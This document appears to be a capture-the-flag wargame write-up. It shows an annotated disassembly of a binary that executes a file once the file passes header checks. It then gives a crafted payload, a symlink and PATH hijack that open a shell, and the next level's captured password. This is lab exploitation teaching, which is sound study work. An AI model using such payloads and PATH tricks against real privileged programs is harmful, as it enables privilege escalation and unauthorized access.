disassembly:
```assembly
   0x080485fb <+0>:	push   ebp
   0x080485fc <+1>:	mov    ebp,esp
   0x080485fe <+3>:	sub    esp,0xb0
   0x08048604 <+9>:	cmp    DWORD PTR [ebp+0x8],0x2		#check for 2 args in envp
   0x08048608 <+13>:	je     0x8048624 <main+41>
   0x0804860a <+15>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804860d <+18>:	mov    eax,DWORD PTR [eax]
   0x0804860f <+20>:	push   eax
   0x08048610 <+21>:	push   0x80487e0
   0x08048615 <+26>:	call   0x8048440 <printf@plt>
   0x0804861a <+31>:	add    esp,0x8
   0x0804861d <+34>:	push   0xffffffff
   0x0804861f <+36>:	call   0x80484a0 <exit@plt>
   0x08048624 <+41>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048627 <+44>:	add    eax,0x4
   0x0804862a <+47>:	mov    eax,DWORD PTR [eax]
   0x0804862c <+49>:	push   0x0
   0x0804862e <+51>:	push   eax
   0x0804862f <+52>:	call   0x80484b0 <open@plt>		#try to open the file
   0x08048634 <+57>:	add    esp,0x8
   0x08048637 <+60>:	mov    DWORD PTR [ebp-0x4],eax
   0x0804863a <+63>:	cmp    DWORD PTR [ebp-0x4],0x0
   0x0804863e <+67>:	jns    0x8048654 <main+89>		#check for error (cant open / not a file)
   0x08048640 <+69>:	push   0x80487f6
   0x08048645 <+74>:	call   0x8048470 <perror@plt>
   0x0804864a <+79>:	add    esp,0x4
   0x0804864d <+82>:	push   0xffffffff
   0x0804864f <+84>:	call   0x80484a0 <exit@plt>
   0x08048654 <+89>:	mov    eax,DWORD PTR [ebp+0xc]		#if good, we are here
   0x08048657 <+92>:	add    eax,0x4
   0x0804865a <+95>:	mov    eax,DWORD PTR [eax]
   0x0804865c <+97>:	lea    edx,[ebp-0xb0]
   0x08048662 <+103>:	push   edx				#buffer to write to
   0x08048663 <+104>:	push   eax				#filename
   0x08048664 <+105>:	call   0x80487a0 <stat>			#get file status
   0x08048669 <+110>:	add    esp,0x8
   0x0804866c <+113>:	test   eax,eax				#check if stat went fine
   0x0804866e <+115>:	jns    0x8048684 <main+137>		#if good jmp
   0x08048670 <+117>:	push   0x80487fb
   0x08048675 <+122>:	call   0x8048470 <perror@plt>		#exit with error otherwise
   0x0804867a <+127>:	add    esp,0x4
   0x0804867d <+130>:	push   0xffffffff
   0x0804867f <+132>:	call   0x80484a0 <exit@plt>
   0x08048684 <+137>:	push   0x34				#continue here
   0x08048686 <+139>:	lea    eax,[ebp-0x38]
   0x08048689 <+142>:	push   eax
   0x0804868a <+143>:	push   DWORD PTR [ebp-0x4]
   0x0804868d <+146>:	call   0x8048430 <read@plt>		#read 52 bytes from file
   0x08048692 <+151>:	add    esp,0xc
   0x08048695 <+154>:	mov    eax,DWORD PTR [ebp-0x1c]
   0x08048698 <+157>:	push   0x0				#mode, 0 = seek offset
   0x0804869a <+159>:	push   eax				#offset = position 29 - 32 in file
   0x0804869b <+160>:	push   DWORD PTR [ebp-0x4]		#file pointer
   0x0804869e <+163>:	call   0x8048450 <lseek@plt>		#reposition the file pointer
   0x080486a3 <+168>:	add    esp,0xc
   0x080486a6 <+171>:	push   0x20
   0x080486a8 <+173>:	lea    eax,[ebp-0x58]
   0x080486ab <+176>:	push   eax
   0x080486ac <+177>:	push   DWORD PTR [ebp-0x4]
   0x080486af <+180>:	call   0x8048430 <read@plt>		#read 32 bytes (after offset of our choice)
   0x080486b4 <+185>:	add    esp,0xc
   0x080486b7 <+188>:	mov    eax,DWORD PTR [ebp-0x4c]		#move place 12 (after offset) to eax
   0x080486ba <+191>:	movzx  edx,BYTE PTR [ebp-0x31]		#move place 8 (no offset) in file to dx
   0x080486be <+195>:	movzx  ecx,dl				#move the same to cx
   0x080486c1 <+198>:	movzx  edx,BYTE PTR [ebp-0x30]		#move place 9 (no offset) to dx
   0x080486c5 <+202>:	movzx  edx,dl				#same
   0x080486c8 <+205>:	imul   edx,ecx				#signed multiply them both, store in edx
   0x080486cb <+208>:	cmp    eax,edx				#compare to eax
   0x080486cd <+210>:	jne    0x80486fa <main+255>		#if not equal, exit
   0x080486cf <+212>:	mov    eax,DWORD PTR [ebp-0x84]		
   0x080486d5 <+218>:	cmp    eax,0x77
   0x080486d8 <+221>:	jg     0x80486fa <main+255>		# if length of file > 0x77 = 119 jump to exit (its not)
   0x080486da <+223>:	push   0x8048800
   0x080486df <+228>:	call   0x8048490 <puts@plt>		#"valid file, executing"
   0x080486e4 <+233>:	add    esp,0x4
   0x080486e7 <+236>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080486ea <+239>:	add    eax,0x4
   0x080486ed <+242>:	mov    eax,DWORD PTR [eax]
   0x080486ef <+244>:	push   0x0
   0x080486f1 <+246>:	push   eax				#execute the file!
   0x080486f2 <+247>:	call   0x80484d0 <execv@plt>		#execute something...
   0x080486f7 <+252>:	add    esp,0x8
   0x080486fa <+255>:	mov    eax,ds:0x8049aa8			#"file not executed" section...
   0x080486ff <+260>:	push   eax
   0x08048700 <+261>:	push   0x12
   0x08048702 <+263>:	push   0x1
   0x08048704 <+265>:	push   0x8048816
   0x08048709 <+270>:	call   0x8048480 <fwrite@plt>
   0x0804870e <+275>:	add    esp,0x10
   0x08048711 <+278>:	push   DWORD PTR [ebp-0x4]
   0x08048714 <+281>:	call   0x80484e0 <close@plt>
   0x08048719 <+286>:	add    esp,0x4
   0x0804871c <+289>:	mov    eax,0x0
   0x08048721 <+294>:	leave  
   0x08048722 <+295>:	ret
```

so, to trick the program, we create the sequence:
"AAAABBBBCCCCDDDDEEEEFFFFGGGG!!!!ABCDEFGHIJKLMNOPQRSTUVXYWZ"
where !!!!, is where in hex, to read from the file (change the offset to 0x!!!! and read 32 bytes)

then we have to pass the multiplying test: B * C == MNOP
so we'll put:
"AAAABBB\x01\x01CCCDDDDEEEEFFFFGGGG\x20\x00\x00\x00ABCDEFGHIJKL\x01\x00\x00\x00QRSTUVXYWZ"

it gets executed!

no we want to put in it a shell: google the usage...
	"pathname must be either a binary executable, or a script starting
	 with a line of the form: #!interpreter [optional-arg]"

--> "#!/bin/shCCCDDDDEEEEFFFFGGGG\x20\x00\x00\x00ABCDEFGHIJKL\x01\x00\x00\x00QRSTUVXYWZ"
where s,h are to be multiplied --> change to s * h = 11960 = 0x2eb8:
--> "#!/bin/sh\x0aAAAAAAAAAAAAAAAAA\x0a\x20\x00\x00\x00ABCDEFGHIJKL\xb8\x2e\x00\x00QRSTUVXYWZ"
```sh
chmod +x a
ln -s /bin/sh AAAAAAAAAAAAAAAAA
PATH=.:PATH
$ cat /etc/maze_pass/maze5
ishipaeroo
```

we get:
ishipaeroo



